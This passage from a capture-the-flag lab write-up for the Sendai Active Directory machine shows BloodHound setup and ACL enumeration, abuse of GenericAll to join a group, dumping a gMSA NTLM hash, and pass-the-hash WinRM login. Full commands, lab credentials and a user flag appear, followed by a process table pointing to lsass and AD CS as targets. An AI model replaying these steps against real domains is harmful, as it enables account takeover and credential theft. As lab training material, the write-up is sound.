                7019007 blocks of size 4096. 1235602 blocks available
smb: \> 

```

It will show the account of database as the 1443 is the port of MS SQL SERVER

```
┌──(root㉿kali)-[~/Desktop]
└─# cat .sqlconfig
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85; 
```

but it show nothing

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc mssql dc.sendai.vl  -u sqlsvc    -p 'SurenessBlob85;'   --local-auth 

```

That is the wrong path

Can i use the thomas.powell to do the bloodhound ?

### Bloodhound Docker Setup

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Setup-Docker-x86" >}} Install the Docker which is matched to install docker-bloodhound

{{< /toggle >}}

#### Docker Setup

```
# 1. Remove the broken docker.io and any leftovers
sudo apt remove -y docker.io docker-compose-plugin
sudo apt autoremove -y
sudo rm -f /var/run/docker.sock

# 2. Add official Docker repository (tested on Kali 2026)
sudo apt update
sudo apt install -y ca-certificates curl gnupg
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian bookworm stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# 3. Install the official Docker CE + Compose plugin
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# 4. Start and enable the Docker service (this should now work!)
sudo systemctl enable --now docker

# 5. Check status (should show "active (running)")
sudo systemctl status docker
                                         
```

The linux is x86\_64 , and download the bloodhound

```
┌──(root㉿kali)-[~/Desktop]
└─# uname -a        
Linux kali 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64 GNU/Linux
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
--2026-04-15 01:29:06--  https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/SpecterOps/bloodhound-cli/releases/download/v0.2.0/bloodhound-cli-linux-amd64.tar.gz [following]
--2026-04-15 01:29:07--  https://github.com/SpecterOps/bloodhound-cli/releases/download/v0.2.0/bloodhound-cli-linux-amd64.tar.gz
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/891698782/5dc76be6-89af-49b6-b61f-095ab9759934?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-15T06%3A24%3A27Z&rscd=attachment%3B+filename%3Dbloodhound-cli-linux-amd64.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-15T05%3A23%3A40Z&ske=2026-04-15T06%3A24%3A27Z&sks=b&skv=2018-11-09&sig=fApLBs5R8IJa9mjYn0nkkboLqa%2F6fj79rsQpvy%2FGW0U%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NjIzMTI0NywibmJmIjoxNzc2MjMwOTQ3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.ZoY6VGQNo_38xcNzXSh3uoGcuaiXyw6Wo8SzbQkxDnE&response-content-disposition=attachment%3B%20filename%3Dbloodhound-cli-linux-amd64.tar.gz&response-content-type=application%2Foctet-stream [following]
--2026-04-15 01:29:07--  https://release-assets.githubusercontent.com/github-production-release-asset/891698782/5dc76be6-89af-49b6-b61f-095ab9759934?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-15T06%3A24%3A27Z&rscd=attachment%3B+filename%3Dbloodhound-cli-linux-amd64.tar.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-15T05%3A23%3A40Z&ske=2026-04-15T06%3A24%3A27Z&sks=b&skv=2018-11-09&sig=fApLBs5R8IJa9mjYn0nkkboLqa%2F6fj79rsQpvy%2FGW0U%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NjIzMTI0NywibmJmIjoxNzc2MjMwOTQ3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.ZoY6VGQNo_38xcNzXSh3uoGcuaiXyw6Wo8SzbQkxDnE&response-content-disposition=attachment%3B%20filename%3Dbloodhound-cli-linux-amd64.tar.gz&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3125707 (3.0M) [application/octet-stream]
Saving to: ‘bloodhound-cli-linux-amd64.tar.gz’

bloodhound-cli-linux-amd64.tar.gz                          100%[========================================================================================================================================>]   2.98M  4.39MB/s    in 0.7s    

2026-04-15 01:29:08 (4.39 MB/s) - ‘bloodhound-cli-linux-amd64.tar.gz’ saved [3125707/3125707]

```

```
──(root㉿kali)-[~/Desktop]
└─# ./bloodhound-cli install                                                                           
[+] Checking the status of Docker and the Compose plugin...
[+] Docker and the Compose plugin checks have passed
[+] Starting BloodHound environment installation
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
 Image docker.io/library/neo4j:4.4 Pulling 
 Image docker.io/specterops/bloodhound:latest Pulling 
 Image docker.io/library/postgres:16 Pulling 
 Container bloodhound-app-db-1 Created 
 Container bloodhound-graph-db-1 Created 
 Container bloodhound-bloodhound-1 Creating 
 Container bloodhound-bloodhound-1 Created 
 Container bloodhound-graph-db-1 Starting 
 Container bloodhound-app-db-1 Starting 
 Container bloodhound-app-db-1 Started 
 Container bloodhound-graph-db-1 Started 
 Container bloodhound-app-db-1 Waiting 
 Container bloodhound-graph-db-1 Waiting 
 Container bloodhound-app-db-1 Healthy 
 Container bloodhound-graph-db-1 Healthy 
 Container bloodhound-bloodhound-1 Starting 
 Container bloodhound-bloodhound-1 Started 
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: N85yJWRcvwvoKaIJlP4puDAoC7RmY3xF
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login

```

### Collect data

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Collect-nxc" >}} Collect the data with netexec

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec ldap DC.sendai.vl  -u thomas.powell   -p 'Password1' --bloodhound -c All --dns-server 10.129.234.66 
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAP        10.129.234.66   389    DC               [+] sendai.vl\thomas.powell:Password1 
LDAP        10.129.234.66   389    DC               Resolved collection methods: psremote, container, trusts, group, session, objectprops, dcom, acl, localadmin, rdp                                                                                                             
LDAP        10.129.234.66   389    DC               Done in 00M 37S
LDAP        10.129.234.66   389    DC               Compressing output into /root/.nxc/logs/DC_10.129.234.66_2026-04-15_012429_bloodhound.zip                                                                                                                                                                                     
```

go to http://127.0.0.1:8080/ui/login

### Bloodhound-vectory

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-GenericAll" >}} Using the Cypher in bloodhound to find the short paths Owned object to Tier to Zero to know the GenericALL to admsvc Group

{{< /toggle >}}

set Thomas.Powell to owned\
![Pasted image 20260415155333.png](/ob/Pasted%20image%2020260415155333.png)

\--> cyber --> search owned --?Shortest paths from Owned object\
![Pasted image 20260415155402.png](/ob/Pasted%20image%2020260415155402.png)

result it here

![Pasted image 20260415155600.png](/ob/Pasted%20image%2020260415155600.png)

In the observer , add the Thomas.powell (support group) to admsvc , and use the ReadGMSAPassword to change MGTSVC which in the remote group , so I can use the winrm to in

Abusing the GenericAll to add thomas.powell into the admsvc group

```
┌──(root㉿kali)-[~/Desktop]
└─# bloodyAD --host DC.sendai.vl  -d sendai.vl -u thomas.powell -p 'Password1' add groupMember "admsvc" thomas.powell
[+] thomas.powell added to admsvc
```

Abusing the ReadGMSAPassword

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-ReadGMSAPassword" >}} Abusing the ReadGMSAPassword by the netexec with gmsa to get the NTLM ,and the account should be in the Remote group , so allow winrm login .

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec ldap DC.sendai.vl -u Thomas.Powell -p Password1  --gmsa  
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAPS       10.129.234.66   636    DC               [+] sendai.vl\Thomas.Powell:Password1 
LDAPS       10.129.234.66   636    DC               [*] Getting GMSA Passwords
LDAPS       10.129.234.66   636    DC               Account: mgtsvc$              NTLM: a18c6df2768f173d38b4dd073f5436b5     PrincipalsAllowedToReadPassword: admsvc       
```

It’s dumped the NTLM hash for the service account.

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec ldap DC.sendai.vl -u mgtsvc$  -H a18c6df2768f173d38b4dd073f5436b5        
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAP        10.129.234.66   389    DC               [+] sendai.vl\mgtsvc$:a18c6df2768f173d38b4dd073f5436b5 

```

The account should be in the Remote group , so let we try the winrm

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec winrm  DC.sendai.vl -u mgtsvc$  -H a18c6df2768f173d38b4dd073f5436b5 
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.66   5985   DC               [+] sendai.vl\mgtsvc$:a18c6df2768f173d38b4dd073f5436b5 (Pwn3d!)
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\mgtsvc$:a18c6df2768f173d38b4dd073f5436b5 zip() argument 2 is longer than argument 1
```

successful in

### evil-winrm-py

{{< toggle "Tag 🏷️" >}}

{{< tag "Port5985-winrm-evil-winrm-py" >}} using the evil-winrm-py login with the hash

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# evil-winrm-py -i DC.sendai.vl  -u mgtsvc$  -H a18c6df2768f173d38b4dd073f5436b5
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC.sendai.vl:5985' as 'mgtsvc$'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\mgtsvc$\Documents> whoami
sendai\mgtsvc$
evil-winrm-py PS C:\Users\mgtsvc$\Documents>

```

```
evil-winrm-py PS C:\> type user.txt
fff335936142d21a6fa44123b897cd3e
```

### Shell As admin

`EC2Launch` and `EC2LaunchService` are interesting. I don’t know if this box originally on VulnLab ran in EC2, and it’s like HTB machines all having VMWare Tools. There’s a process called `helpdesk`:

```
evil-winrm-py PS C:\Program Files (x86)> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    119       8     5824      10924              3952   0 AggregatorHost                                                
    145      11    21148      14624              2784   0 amazon-ssm-agent                                              
    392      33    12376      21672              2672   0 certsrv                                                       
     81       6     2264       4100              3540   0 cmd                                                           
    150      10     6580      13224              3608   0 conhost                                                       
    573      22     2036       6480               428   0 csrss                                                         
    176      11     1856       6060               536   1 csrss                                                         
    413      34    17016      25848              2140   0 dfsrs                                                         
    198      13     2328       8572              3312   0 dfssvc                                                        
    277      15     3896      15004              3508   0 dllhost                                                       
  10383    7494   130020     128524              2976   0 dns                                                           
    631      26    19488      46732               364   1 dwm                                                           
    167      12    23376      17472              4924   0 EC2Launch                                                     
     72       6      788       3760              3260   0 EC2LaunchService                                              
     39       6     1484       4104              4832   1 fontdrvhost                                                   
     39       6     1332       3704              4836   0 fontdrvhost                                                   
    198      12    12260      12628              3168   0 helpdesk                                                      
      0       0       60          8                 0   0 Idle                                                          
    148      13     1920       6360              3100   0 ismserv                                                       
    462      27    12900      49340              5328   1 LogonUI                                                       
   2089     182    73888      78236               680   0 lsass                                                         
    647      32    37064      49004              2688   0 Microsoft.ActiveDirectory.WebServices                         
    215      14     1988       4772               564   0 MicrosoftEdgeUpdate                                           
    239      14     3040      11468              4180   0 msdtc                                                         
      0      13     1964      12720               100   0 Registry                                                      
    638      15     5852      14508               664   0 services                                                      
     57       3     1104       1228               312   0 smss                                                          
    446      23     5660      16920              2276   0 spoolsv                                                       
    856      32    37752      52228              5236   0 sqlceip                                                       
    780      59   367924     247496              5160   0 sqlservr                                                      
    147      11     1848       8456              3140   0 sqlwriter                                                     
    231      13     3200      11340               396   0 svchost                                                       
    193      13     1568       7516               520   0 svchost                                                       
    309      20     8796      16312               704   0 svchost                                                       
    462      19     3756      13040               800   0 svchost                                                       
    785      16     5264      15264               884   0 svchost                                                       
    118       8     1240       5764               900   0 svchost                                                       
    649      19     6112      13152               924   0 svchost                                                       
    131      15     3144       7632               940   0 svchost                                                       
    271      12     2124       9416               984   0 svchost                                                       
    190      11     1792       8700              1096   0 svchost                                                       
    135       8     1268       6348              1104   0 svchost                                                       
    237      11     2096       8240              1148   0 svchost                                                       
    301      17     3336       9784              1180   0 svchost                                                       
    346      14    12200      17404              1276   0 svchost                                                       
    412      32    10996      20912              1360   0 svchost                                                       
    399      17     4180      13628              1412   0 svchost                                                       
    272      16     2912      13492              1496   0 svchost                                                       
    409      14     2668      11052              1552   0 svchost                                                       
    367      18     4780      15864              1592   0 svchost                                                       
    238      14     2756      18532              1636   0 svchost                                                       
    438      10     2852       9484              1644   0 svchost                                                       
    147       9     1380       7168              1660   0 svchost                                                       
    120       8     1200       6088              1672   0 svchost                                                       
    175      10     1772       7860              1752   0 svchost                                                       
    128       8     1264       5964              1868   0 svchost                                                       
    144       8     1304       6564              1920   0 svchost                                                       
    291      12     2040       9236              1932   0 svchost                                                       
    227      14     2404      10428              1984   0 svchost                                                       
    141      10     1560       7168              2012   0 svchost                                                       
    226      12     2172       9956              2044   0 svchost                                                       
    112       8     1144       6124              2056   0 svchost                                                       
    151       9     1636       8048              2152   0 svchost                                                       
    350      28     3892      14580              2208   0 svchost                                                       
    246      15     2192      10720              2216   0 svchost                                                       
    365      15     2672      11100              2308   0 svchost                                                       
    179      12     3988      11828              2464   0 svchost                                                       
    413      16    10672      20836              2620   0 svchost                                                       
    192      16     6108      10824              2664   0 svchost                                                       
    232      14     2704      12596              2700   0 svchost                                                       
    165      11     1780       7768              2708   0 svchost                                                       
    125       8     1236       6292              2740   0 svchost                                                       
    251      14     3064      15248              2828   0 svchost                                                       
    476      24    14968      32188              2968   0 svchost                                                       
    211      12     2328       9492              3008   0 svchost                                                       
    335      14     4872      13416              3076   0 svchost                                                       
    139       9     1516       7000              3132   0 svchost                                                       
    245      15     4796      13364              3296   0 svchost                                                       
    278      35     3084      13896              3344   0 svchost                                                       
    127       9     1412      11272              3352   0 svchost                                                       
    141       9     1580       8360              3816   0 svchost                                                       
    206      12     2224      11900              4888   0 svchost                                                       
    125       9     1332       7504              5036   0 svchost                                                       
    310      17    15348      18500              5724   0 svchost                                                       
    246      13     3868      11364              6096   0 svchost                                                       
   1627       0       40        140                 4   0 System                                                        
    214      16     2452      11196              4308   0 vds                                                           
    170      11     2436      11144              3324   0 VGAuthService                                                 
    124       9     1556       6636              3240   0 vm3dservice                                                   
    131      10     1672       7112              3616   1 vm3dservice                                                   
    434      24    11128      24696              3220   0 vmtoolsd                                                      
    151      11     1368       7272               528   0 wininit                                                       
    226      13     2820      15932               600   1 winlogon                                                      
    440      21    12120      24416              4160   0 WmiPrvSE                                                      
    877      37    69180      88988       2.31   5520   0 wsmprovhost                                                   
```

AI can give me that

| ProcessName                           | Id (PID) | Handles | NPM(K) | PM(K)  | WS(K)  | CPU(s) | SI | What it is / Does                                                                       | Relevance / Notes (pentest / admin)                                                                                                                    |
| ------------------------------------- | -------- | ------- | ------ | ------ | ------ | ------ | -- | --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| AggregatorHost                        | 3952     | 119     | 8      | 5824   | 10924  | 0      | 0  | Windows Connected Devices / Telemetry Aggregator Host (part of Windows Diagnostic Data) | Normal Windows telemetry process. Can be disabled but usually harmless.                                                                                |
| amazon-ssm-agent                      | 2784     | 145     | 11     | 21148  | 14624  | 0      | 0  | AWS Systems Manager Agent                                                               | Allows AWS console / SSM remote management. Very useful for admins, can be abused for persistence.                                                     |
| certsrv                               | 2672     | 392     | 33     | 12376  | 21672  | 0      | 0  | Active Directory Certificate Services (AD CS)                                           | Certificate authority service. Common on domain controllers. High-value target for cert theft / ESC attacks.                                           |
| cmd                                   | 3540     | 81      | 6      | 2264   | 4100   | 0      | 0  | Command Prompt (cmd.exe)                                                                | This is likely the shell you launched inside evil-winrm or a child process.                                                                            |
| conhost                               | 3608     | 150     | 10     | 6580   | 13224  | 0      | 0  | Console Host (hosts cmd.exe / powershell consoles)                                      | Normal companion to cmd / powershell.                                                                                                                  |
| csrss                                 | 428      | 573     | 22     | 2036   | 6480   | 0      | 0  | Client/Server Runtime Subsystem (Session 0)                                             | Core Windows process — **do not kill**. Handles kernel-user communication.                                                                             |
| csrss                                 | 536      | 176     | 11     | 1856   | 6060   | 0      | 1  | Client/Server Runtime Subsystem (Session 1)                                             | Same as above, one per user session.                                                                                                                   |
| dfsrs                                 | 2140     | 413     | 34     | 17016  | 25848  | 0      | 0  | DFS Replication Service                                                                 | Replicates SYSVOL, folders, etc. in AD environment.                                                                                                    |
| dfssvc                                | 3312     | 198     | 13     | 2328   | 8572   | 0      | 0  | Distributed File System (DFS) Namespace service                                         | Handles DFS shares/namespaces.                                                                                                                         |
| dllhost                               | 3508     | 277     | 15     | 3896   | 15004  | 0      | 0  | COM Surrogate (DLL Host)                                                                | Hosts COM/DLL components. Normal.                                                                                                                      |
| dns                                   | 2976     | 10383   | 7494   | 130020 | 128524 | 0      | 0  | Windows DNS Server                                                                      | This server is a DNS server (very high memory/handles). Critical for AD.                                                                               |
| dwm                                   | 364      | 631     | 26     | 19488  | 46732  | 0      | 1  | Desktop Window Manager                                                                  | Handles Aero/transparent effects (RDP session).                                                                                                        |
| EC2Launch                             | 4924     | 167     | 12     | 23376  | 17472  | 0      | 0  | AWS EC2 Launch script (first-boot configuration)                                        | AWS-specific instance initialization.                                                                                                                  |
| EC2LaunchService                      | 3260     | 72      | 6      | 788    | 3760   | 0      | 0  | AWS EC2 Launch Service (background service)                                             | Keeps EC2 metadata & launch tasks running.                                                                                                             |
| fontdrvhost                           | 4832     | 39      | 6      | 1484   | 4104   | 0      | 1  | Font Driver Host (user session)                                                         | Loads fonts for the session.                                                                                                                           |
| fontdrvhost                           | 4836     | 39      | 6      | 1332   | 3704   | 0      | 0  | Font Driver Host (system)                                                               | Same as above, system version.                                                                                                                         |
| helpdesk                              | 3168     | 198     | 12     | 12260  | 12628  | 0      | 0  | Third-party Helpdesk application/service (not native Windows)                           | **Non-standard**. Likely a custom or installed helpdesk tool (e.g. ManageEngine, ConnectWise, etc.). Worth investigating for credentials or backdoors. |
| Idle                                  | 0        | 0       | 0      | 60     | 8      | 0      | 0  | System Idle Process                                                                     | Normal — represents CPU idle time.                                                                                                                     |
| ismserv                               | 3100     | 148     | 13     | 1920   | 6360   | 0      | 0  | Intersite Messaging Service                                                             | AD service for inter-site replication (rarely used but normal on DCs).                                                                                 |
| LogonUI                               | 5328     | 462     | 27     | 12900  | 49340  | 0      | 1  | Windows Logon UI                                                                        | The login screen / Ctrl+Alt+Del interface.                                                                                                             |
| lsass                                 | 680      | 2089    | 182    | 73888  | 78236  | 0      | 0  | Local Security Authority Subsystem Service                                              | **Extremely important**. Stores/hashes passwords, Kerberos tickets, NTLM. Prime target for credential dumping (Mimikatz, etc.).                        |
| Microsoft.ActiveDirectory.WebServices | 2688     | 647     | 32     | 37064  | 49004  | 0      | 0  | Active Directory Web Services (ADWS)                                                    | Powershell AD cmdlets over HTTP. Common on DCs.                                                                                                        |
| MicrosoftEdgeUpdate                   | 564      | 215     | 14     | 1988   | 4772   | 0      | 0  | Microsoft Edge Updater                                                                  | Edge browser auto-update service.                                                                                                                      |
| msdtc                                 | 4180     | 239     | 14     | 3040   | 11468  | 0      | 0  | Microsoft Distributed Transaction Coordinator                                           | Handles distributed DB transactions (used by SQL).                                                                                                     |
| Registry                              | 100      | 0       | 13     | 1964   | 12720  | 0      | 0  | Windows Registry process                                                                | Core OS process that manages the registry hive.                                                                                                        |
| services                              | 664      | 638     | 15     | 5852   | 14508  | 0      | 0  | Service Control Manager (services.exe)                                                  | Core Windows service manager.                                                                                                                          |
| smss                                  | 312      | 57      | 3      | 1104   | 1228   | 0      | 0  | Session Manager Subsystem                                                               | Very early boot process. Critical — do not kill.                                                                                                       |
| spoolsv                               | 2276     | 446     | 23     | 5660   | 16920  | 0      | 0  | Print Spooler Service                                                                   | Print spooler. Frequently exploited (PrintNightmare style attacks).                                                                                    |
| sqlceip                               | 5236     | 856     | 32     | 37752  | 52228  | 0      | 0  | SQL Server Customer Experience Improvement Program (telemetry)                          | Sends SQL usage data to Microsoft.                                                                                                                     |
| sqlservr                              | 5160     | 780     | 59     | 367924 | 247496 | 0      | 0  | Microsoft SQL Server (database engine)                                                  | Main SQL Server process. Uses massive memory — this is your DB.                                                                                        |
| sqlwriter                             | 3140     | 147     | 11     | 1848   | 8456   | 0      | 0  | SQL Server VSS Writer                                                                   | Helps with Volume Shadow Copy backups of SQL databases.                                                                                                |
| svchost                               | 396      | 231     | 13     | 3200   | 11340  | 0      | 0  | Service Host (generic container for Windows services)                                   | Normal. Each svchost can host one or more services (see full list below).                                                                              |
| svchost                               | 800      | 462     | 19     | 3756   | 13040  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 884      | 785     | 16     | 5264   | 15264  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 900      | 118     | 8      | 1240   | 5764   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 924      | 649     | 19     | 6112   | 13152  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 940      | 131     | 15     | 3144   | 7632   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 984      | 271     | 12     | 2124   | 9416   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1096     | 190     | 11     | 1792   | 8700   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1104     | 135     | 8      | 1268   | 6348   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1148     | 237     | 11     | 2096   | 8240   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1180     | 301     | 17     | 3336   | 9784   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1276     | 346     | 14     | 12200  | 17404  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1360     | 412     | 32     | 10996  | 20912  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1412     | 399     | 17     | 4180   | 13628  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1496     | 272     | 16     | 2912   | 13492  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1552     | 409     | 14     | 2668   | 11052  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1592     | 367     | 18     | 4780   | 15864  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1636     | 238     | 14     | 2756   | 18532  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1644     | 438     | 10     | 2852   | 9484   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1660     | 147     | 9      | 1380   | 7168   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1672     | 120     | 8      | 1200   | 6088   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1752     | 175     | 10     | 1772   | 7860   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1868     | 128     | 8      | 1264   | 5964   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1920     | 144     | 8      | 1304   | 6564   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1932     | 291     | 12     | 2040   | 9236   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 1984     | 227     | 14     | 2404   | 10428  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2012     | 141     | 10     | 1560   | 7168   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2044     | 226     | 12     | 2172   | 9956   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2056     | 112     | 8      | 1144   | 6124   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2152     | 151     | 9      | 1636   | 8048   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2208     | 350     | 28     | 3892   | 14580  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2216     | 246     | 15     | 2192   | 10720  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2308     | 365     | 15     | 2672   | 11100  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2464     | 179     | 12     | 3988   | 11828  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2620     | 413     | 16     | 10672  | 20836  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2664     | 192     | 16     | 6108   | 10824  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2700     | 232     | 14     | 2704   | 12596  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2708     | 165     | 11     | 1780   | 7768   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2740     | 125     | 8      | 1236   | 6292   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2828     | 251     | 14     | 3064   | 15248  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 2968     | 476     | 24     | 14968  | 32188  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 3008     | 211     | 12     | 2328   | 9492   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 3076     | 335     | 14     | 4872   | 13416  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 3132     | 139     | 9      | 1516   | 7000   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 3296     | 245     | 15     | 4796   | 13364  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 3344     | 278     | 35     | 3084   | 13896  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 3352     | 127     | 9      | 1412   | 11272  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 3816     | 141     | 9      | 1580   | 8360   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 4888     | 206     | 12     | 2224   | 11900  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
